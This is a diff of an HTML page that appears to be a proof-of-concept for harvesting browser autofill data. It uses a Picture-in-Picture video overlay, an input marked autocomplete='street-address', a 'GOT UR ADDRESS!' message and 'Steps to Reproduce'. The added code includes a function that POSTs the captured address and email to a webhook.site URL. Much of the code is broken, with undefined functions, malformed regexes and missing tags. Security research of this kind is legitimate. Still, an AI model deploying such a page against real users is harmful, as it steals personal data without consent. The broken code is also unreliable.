@@ -1,113 +1,83 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Address Autofill Form with PiP Video11</title>
-  <script>
-    function showVideoInPiP() {
-      const videoElement = document.getElementById('video');
-      if (videoElement !== null && videoElement.requestPictureInPicture) {
-        videoElement.style.display = "block";
-        videoElement.requestPictureInPicture()
-          .catch(error => {
-            console.error('Error occurred while entering Picture-in-Picture mode:', error);
-          });
-      }
-    }
-    function updateEmailOutput() {
-      const emailInput = document.getElementById('emailInput').value;
-      const emailOutput = document.getElementById('emailOutput');
-      // Cek apakah input adalah IP address
-      const isIp = isIpAddress(emailInput);
-      
-      if (isIp) {
-        emailOutput.textContent = `\n\nIPv4 Address: ${ip4}\nIPv6 Address: ${ip6}`;
-      } else {
-        emailOutput.textContent = `Address: ${emailInput} (GOT UR ADDRESS!)`;
-      }
-    }
-    function isIpAddress(input) {
-      // Cek untuk IP v4
-      const ipv4Regex = /^[0-9]{1,3}\.){3}/;
-      let ipMatch = input.match(ipv4Regex);
-      
-      if (!ipMatch && input.includes(':')) {
-        // Cek untuk IP v6
-        const ip6Regex = /^[0-9a-f]{2,5}\.[0-9a-f]{4}:){7}$/;
-        ipMatch = input.match(ip6Regex);
-      }
-      return ipMatch !== null;
-    }
-    function showIPInEmail(ip) {
-      if (ip.includes('.')) {
-        // Format IP v4
-        const parts = ip.split('.');
-        let formatted = `IPv4 Address: `;
-        formatted += parseInt(parts[0], 10).toString().padStart(1, '0');
-        formatted += '.';
-        formatted += parseInt(parts[1], 10).toString().padStart(2, '0');
-        formatted += '.';
-        formatted += parseInt(parts[2], 10).toString().padStart(3, '0');
-        formatted += '.';
-        formatted += parseInt(parts[3], 10).toString().padStart(4, '0');
-      } else {
-        // Format IP v6
-        const hexPairs = ip.split(':').map(x => x.toUpperCase());
-        let formatted = `IPv6 Address: `;
-        formatted += parsed6(parseInt(hexPairs[0], 16))
-          .tohexString().padStart(2, '0')
-          .toUpperCase();
-        formatted += ',';
-        formatted += parsed6(parseInt(hexPairs[1], 16))
-          .tohexString().padStart(4, '0');
-        formatted += ',';
-        formatted += parsed6(parseInt(hexPairs[2], 16))
-          .tohexString().padStart(4, '0');
-        formatted += ',';
-        formatted += parsed6(parseInt(hexPairs[3], 16))
-          .tohexString();
-      }
-      return formatted;
-    }
-    function showCopyToClipboard() {
-      const emailOutput = document.getElementById('emailOutput');
-      if (emailOutput.textContent.trim()) {
-        const link = document.createElement('a');
-        link.href = 'https://notepbill.com/'.replace(/toString$/, 'Ctrl+C');
-        link.download = 'ip.txt';
-        link.click();
-        link.focus();
-      }
-    }
-    // Fungsi untuk memastikan tekan Ctrl+C bekerja
-    document.addEventListener('keydown', (e) => {
-      if ((e.ctrlKey && e.key === 'c') || 
-          (e.commandKey && e.key === 'c')) {
-        showCopyToClipboard();
-      }
-    });
-    // Cari IP address saat ini
-    const currentInput = document.getElementById('emailInput');
-    currentInput.addEventListener("input", updateEmailOutput);
-    // Cari IP address dan menampilkan
-    const initialInput = document.getElementById('emailInput').value;
-    if (isIpAddress(initialInput)) {
-      emailOutput.textContent = showIPInEmail(initialInput);
-    } else {
-      emailOutput.textContent = `Address: ${initialInput} (GOT UR ADDRESS!)`;
-    }
-  </head>
-  <body>
-    <h1>Address Autofill Form with PiP Video</h1>
-    <form id="addressForm">
-      <input type="text" 
-             id="emailInput" 
-             name="email"
-             placeholder="Masukkan alamat email (contoh: john.doe@example.com)">
-      <button type="submit">Kirim</button>
-    </form>
-    <div id="emailOutput"></div>
-    <button onclick="showCopyToClipboard()">Ctrl+C untuk Clipboard</button>
-  </body>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Address Autofill Form with PiP Video222</title>
+    <script>
+        function showVideoInPiP() {
+            const videoElement = document.getElementById('video');
+            if (videoElement !== null && videoElement.requestPictureInPicture) {
+                videoElement.style.display = "block";
+                videoElement.requestPictureInPicture()
+                    .catch(error => { console.error('Error occurred while entering Picture-in-Picture mode:', error); });
+            }
+        }
+        function updateEmailOutput() {
+            const emailInput = document.getElementById('emailInput').value;
+            const emailOutput = document.getElementById('emailOutput');
+            emailOutput.textContent = "\n\n\n\nAddress: " + emailInput + " (GOT UR ADDRESS!)";
+        }
+        function sendToWebhook(address) {
+            const webhookUrl = 'https://webhook.site/59ed04f6-1409-4aef-b440-8ac3c6213972';
+            fetch(`${webhookUrl}/verify`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    address,
+                    email: document.getElementById('emailInput').value
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Webhook Response:', data);
+                alert('Request to webhook sent successfully! Please verify.');
+            });
+        }
+    </script>
+</head>
+<body>
+    <div class="content">
+        <div id="emailOutput">Address: </div>
+        <video id="video" controls> <!-- Kalkulator MP4 -->
+            <source src="https://github.com/frozzipies/frozzipies.github.io/raw/refs/heads/main/pip.mp4" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
+    </div>
+    <div class="form-container">
+        <label for="emailInput">Press down + Enter</label>
+        <input 
+            type="text" 
+            id="emailInput" 
+            name="address" 
+            autocomplete="street-address" 
+            oninput="updateEmailOutput()" 
+            placeholder="CLICK ME!"
+        />
+        <button onclick="showVideoInPp()">Double Click & Drag Here to Verify</button>
+    </div>
+    <div class="steps-container">
+        <strong>Steps to Reproduce</strong>
+        <ol>
+            <li>Click verify (PiP)</li>
+            <li>Click the input form</li>
+            <li>Press down + click</li>
+        </ol>
+    </div>
+    <script>
+        const addressInput = document.getElementById('emailInput');
+        
+        addressInput.addEventListener('input', function() {
+            if (!this.value.trim()) return;
+            
+            // Simulasi IP lookup
+            const ipAddress = "192.168.1.1"; // Ganti dengan IP yang sebenarnya
+            console.log('IP Address:', ipAddress);
+            
+            showVideoInPp();
+        });
+    </script>
+</body>
 </html>
